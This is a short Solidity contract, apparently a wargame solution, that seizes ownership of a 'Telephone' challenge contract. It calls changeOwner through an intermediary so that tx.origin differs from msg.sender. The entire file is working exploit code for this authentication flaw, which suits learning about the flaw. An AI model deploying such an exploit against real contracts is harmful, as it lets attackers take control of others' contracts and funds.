// SPDX-License-Identifier: MIT

pragma solidity ^0.8.10;

interface ITelephone {
    function changeOwner(address _owner) external;
}

contract TelephoneAttack {
    ITelephone public challenge;

    constructor(address challengeAddress) {
        challenge = ITelephone(challengeAddress);
    }

    function attack() public {
        challenge.changeOwner(tx.origin);
    }
}